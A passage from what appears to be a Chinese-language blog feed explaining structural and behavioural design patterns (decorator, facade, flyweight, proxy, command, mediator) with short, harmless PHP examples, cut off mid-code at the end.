<h2 id="8-装饰器模式"><a href="#8-装饰器模式" class="headerlink" title="8. 装饰器模式"></a>8. 装饰器模式</h2><p>修饰模式，是面向对象编程领域中，一种动态地往一个类中添加新的行为的设计模式。就功能而言，修饰模式相比生成子类更为灵活，这样可以给某个对象而不是整个类添加一些功能。</p>
<p>一般来说，给一个对象或者类增加行为的方式可以有两种：</p>
<p>继承机制，使用继承机制是给现有类添加功能的一种有效途径，通过继承一个现有类可以使得子类在拥有自身方法的同时还拥有父类的方法。但是这种方法是静态的，用户不能控制增加行为的方式和时机。</p>
<p>关联机制，即将一个类的对象嵌入另一个对象中，由另一个对象来决定是否调用嵌入对象的行为以便扩展自己的行为，我们称这个嵌入的对象为装饰器 (Decorator)</p>
<p>通过使用修饰模式，可以在运行时扩充一个类的功能。原理是：增加一个修饰类包裹原来的类，包裹的方式一般是通过在将原来的对象作为修饰类的构造函数的参数。装饰类实现新的功能，但是，在不需要用到新功能的地方，它可以直接调用原来的类中的方法。修饰类必须和原来的类有相同的接口。</p>
<p>修饰模式是类继承的另外一种选择。类继承在编译时候增加行为，而装饰模式是在运行时增加行为。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Component:</span> 抽象构件</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteComponent:</span> 具体构件</span><br><span class="line"></span><br><span class="line"><span class="symbol">Decorator:</span> 抽象装饰类</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteDecorator:</span> 具体装饰类</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyComponent</span> <span class="keyword">extends</span> <span class="title">Component</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是正常的组件方法 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Decorator</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$component</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Component <span class="variable">$component</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;component = <span class="variable">$component</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;component-&gt;<span class="title function_ invoke__">operation</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDecorator</span> <span class="keyword">extends</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Component <span class="variable">$component</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$component</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMethod</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是装饰器添加的方法 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addMethod</span>();</span><br><span class="line">      <span class="built_in">parent</span>::<span class="title function_ invoke__">operation</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$component</span> = <span class="keyword">new</span> <span class="title class_">MyComponent</span>();</span><br><span class="line"><span class="variable">$da</span> = <span class="keyword">new</span> <span class="title class_">MyDecorator</span>(<span class="variable">$component</span>);</span><br><span class="line"><span class="variable">$da</span>-&gt;<span class="title function_ invoke__">operation</span>();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>DataStructure</category>
      </categories>
  </entry>
  <entry>
    <title>设计模式（三），结构型模式</title>
    <url>/2017/11/uml-design2/</url>
    <content><![CDATA[<h2 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h2><p>外观模式 (Facade Pattern)：外部与一个子系统的通信必须通过一个统一的外观对象进行，为子系统中的一组接口提供一个一致的界面。</p>
<p>外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。外观模式又称为门面模式，它是一种对象结构型模式。</p>
<span id="more"></span>

<p>举一个简单的例子，相信大家都使用过 C++ 语言，他是一门编译型语言，写完代码之后，我们需要经过编译之后才能运行，在 IDE 中，会有一个 Build 的按钮，点击它即可完成编译过程，但是这一个简单的动作背后，却是一系列复杂操作的协调配合，至少包括词法分析，语法分析，生成中间代码，生成汇编代码以及链接等操作，作为普通开发人员，我们不必在意这些过程是如何完成的，只需要点击 Build 按钮，IDE 就会自动帮我们完成背后的工作。那么这个 Build 按钮就是 IDE 为我们提供的高级接口，通过他来完成各种子系统的协调工作。</p>
<p>角色：</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">Facade：外观角色，提供高级接口</span><br><span class="line"></span><br><span class="line">Sub<span class="params">System</span>：子系统角色，负责各自的功能实现</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SystemA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operationA</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;operationA &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SystemB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operationB</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;operationB &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SystemC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operationC</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;operationC &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$systemA</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$systemB</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$systemC</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemA = <span class="keyword">new</span> <span class="title function_ invoke__">SystemA</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemB = <span class="keyword">new</span> <span class="title function_ invoke__">SystemB</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemC = <span class="keyword">new</span> <span class="title function_ invoke__">SystemC</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myOperation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemA-&gt;<span class="title function_ invoke__">operationA</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemB-&gt;<span class="title function_ invoke__">operationB</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;systemC-&gt;<span class="title function_ invoke__">operationC</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$facade</span> = <span class="keyword">new</span> <span class="title class_">Facade</span>();</span><br><span class="line"><span class="variable">$facade</span>-&gt;<span class="title function_ invoke__">myOperation</span>();</span><br></pre></td></tr></table></figure>

<p>使用外观模式最大的优点就是子系统与客户端之间是松耦合的关系，客户端不必知道具体有哪些子系统，也无需知道他们是如何工作的，通过引入一个外观类，提供一个客户端间接访问子系统的高级接口。子系统和外观类可以独立运作，修改某一个子系统的内容，不会影响到其他子系统，也不会影响到外观对象。不过它的缺点就是它不够灵活，当需要增加一个子系统的时候，需要修改外观类。</p>
<h2 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h2><p>享元模式（英语：Flyweight Pattern）是一种软件设计模式)。它使用共享物件，用来尽可能减少内存使用量以及分享资讯给尽可能多的相似物件；它适合用于当大量物件只是重复因而导致无法令人接受的使用大量内存。通常物件中的部分状态是可以分享。常见做法是把它们放在外部数据结构，当需要使用时再将它们传递给享元。由于享元模式要求能够共享的对象必须是细粒度对象，因此它又称为轻量级模式，它是一种对象结构型模式。</p>
<p>要理解享元模式，先要理解两个重要的概念：内部状态和外部状态。</p>
<p>内部状态存储于 flyweight 中，它包含了独立于 flyweight 场景的信息，这些信息使得 flyweight 可以被共享。而外部状态取决于 flyweight 场景，并根据场景而变化，因此不可共享。用户对象负责在必要的时候将外部状态传递给 flyweight。</p>
<p>角色</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Flyweight： 抽象享元类</span><br><span class="line"></span><br><span class="line">ConcreteFlyweight： 具体享元类</span><br><span class="line"></span><br><span class="line">UnsharedConcreteFlyweight： 非共享具体享元类</span><br><span class="line"></span><br><span class="line">FlyweightFactory： 享元工厂类</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Flyweight</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFlyweight</span> <span class="keyword">implements</span> <span class="title">Flyweight</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$intrinsicState</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;intrinsicState = <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;MyFlyweight[&#x27;</span>.<span class="variable language_">$this</span>-&gt;intrinsicState.<span class="string">&#x27;] do operation. &lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlyweightFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$flyweightPool</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$flyweightPool</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$flyweightPool</span> = [];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlyweight</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$str</span>,<span class="built_in">self</span>::<span class="variable">$flyweightPool</span>)) &#123;</span><br><span class="line">          <span class="variable">$fw</span> = <span class="keyword">new</span> <span class="title class_">MyFlyweight</span>(<span class="variable">$str</span>);</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$flyweightPool</span>[<span class="variable">$str</span>] = <span class="variable">$fw</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable">$fw</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;aready in the pool,use the exist one: &lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$flyweightPool</span>[<span class="variable">$str</span>];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$factory</span> = <span class="keyword">new</span> <span class="title class_">FlyweightFactory</span>();</span><br><span class="line"><span class="variable">$fw</span> = <span class="variable">$factory</span>-&gt;<span class="title function_ invoke__">getFlyweight</span>(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line"><span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">operation</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fw1</span> = <span class="variable">$factory</span>-&gt;<span class="title function_ invoke__">getFlyweight</span>(<span class="string">&#x27;two&#x27;</span>);</span><br><span class="line"><span class="variable">$fw1</span>-&gt;<span class="title function_ invoke__">operation</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fw2</span> = <span class="variable">$factory</span>-&gt;<span class="title function_ invoke__">getFlyweight</span>(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line"><span class="variable">$fw2</span>-&gt;<span class="title function_ invoke__">operation</span>();</span><br></pre></td></tr></table></figure>

<p>享元模式的核心在于享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，用户需要对象时，首先从享元池中获取，如果享元池中不存在，则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。</p>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>所谓的代理者是指一个类别可以作为其它东西的接口。代理者可以作任何东西的接口：网络连接、内存中的大对象、文件或其它昂贵或无法复制的资源。</p>
<p>代理对象可以在客户端和目标对象之间起到 中介的作用，并且可以通过代理对象去掉客户不能看到 的内容和服务或者添加客户需要的额外服务。</p>
<p>可能大家听得最多且最常用的就是 VPN 网络代理，或者代理服务器等。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Subject:</span> 抽象主题角色</span><br><span class="line"></span><br><span class="line"><span class="symbol">Proxy:</span> 代理主题角色</span><br><span class="line"></span><br><span class="line"><span class="symbol">RealSubject:</span> 真实主题角色</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;RealSubject::request &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">Subject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$realSubject</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;realSubject = <span class="keyword">new</span> <span class="title class_">RealSubject</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">beforeRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Proxy::beforeRequest &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">beforeRequest</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;realSubject-&gt;<span class="title function_ invoke__">request</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">afterRequest</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">afterRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Proxy::afterRequest &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$proxy</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>();</span><br><span class="line"><span class="variable">$proxy</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br></pre></td></tr></table></figure>

<p>下面将会介绍五种行为型模式。</p>
<h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p>在软件设计中，我们经常需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是哪个，我们只需在程序运行时指定具体的请求接收者即可，此时，可以使用命令模式来进行设计，使得请求发送者与请求接收者消除彼此之间的耦合，让对象之间的调用关系更加灵活。</p>
<p>主要特点就是将一个请求封装为一个对象，从而使我们可用不同的请求对客户进行参数化；对请求排队或者记录请求日志，以及支持可撤销的操作。命令模式是一种对象行为型模式，其别名为动作 (Action) 模式或事务 (Transaction) 模式。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Command:</span> 抽象命令类</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteCommand:</span> 具体命令类</span><br><span class="line"></span><br><span class="line"><span class="symbol">Invoker:</span> 调用者</span><br><span class="line"></span><br><span class="line"><span class="symbol">Receiver:</span> 接收者</span><br><span class="line"></span><br><span class="line"><span class="symbol">Client:</span> 客户类</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Receiver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Receiver-&gt;Action&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$receiver</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Receiver <span class="variable">$receiver</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;receiver = <span class="variable">$receiver</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Execute</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCommand</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Receiver <span class="variable">$receiver</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$receiver</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;receiver-&gt;<span class="title function_ invoke__">Action</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoker</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Command <span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;command-&gt;<span class="title function_ invoke__">Execute</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$receiver</span> = <span class="keyword">new</span> <span class="title class_">Receiver</span>();</span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">MyCommand</span>(<span class="variable">$receiver</span>);</span><br><span class="line"><span class="variable">$invoker</span> = <span class="keyword">new</span> <span class="title class_">Invoker</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$invoker</span>-&gt;<span class="title function_ invoke__">Invoke</span>();</span><br></pre></td></tr></table></figure>

<h2 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h2><p>《设计模式：可复用面向对象软件的基础》一书中对中介者模式定义：用一个中介对象来封装一系列的对象交互。中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。</p>
<p>举个简单的例子，就比如大家平时喜欢用微信聊天，你发送的聊天内容需要通过微信服务器进行中间处理，然后下发给你的好友，微信服务器就是一个中介者。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Mediator:</span> 抽象中介者</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteMediator:</span> 具体中介者</span><br><span class="line"></span><br><span class="line"><span class="symbol">Colleague:</span> 抽象同事类</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteColleague:</span> 具体同事类</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Colleague</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$mediator</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMsg</span>(<span class="params"><span class="variable">$who</span>,<span class="variable">$msg</span></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">receiveMsg</span>(<span class="params"><span class="variable">$msg</span></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setMediator</span>(<span class="params">Mediator <span class="variable">$mediator</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;mediator = <span class="variable">$mediator</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColleagueA</span> <span class="keyword">extends</span> <span class="title">Colleague</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMsg</span>(<span class="params"><span class="variable">$toWho</span>,<span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Send Msg From ColleagueA To: &quot;</span>.<span class="variable">$toWho</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;mediator-&gt;<span class="title function_ invoke__">opreation</span>(<span class="variable">$toWho</span>,<span class="variable">$msg</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">receiveMsg</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;ColleagueA Receive Msg: &quot;</span>.<span class="variable">$msg</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColleagueB</span> <span class="keyword">extends</span> <span class="title">Colleague</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMsg</span>(<span class="params"><span class="variable">$toWho</span>,<span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Send Msg From ColleagueB To: &quot;</span>.<span class="variable">$toWho</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;mediator-&gt;<span class="title function_ invoke__">opreation</span>(<span class="variable">$toWho</span>,<span class="variable">$msg</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">receiveMsg</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;ColleagueB Receive Msg: &quot;</span>.<span class="variable">$msg</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Mediator</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">opreation</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$message</span></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span 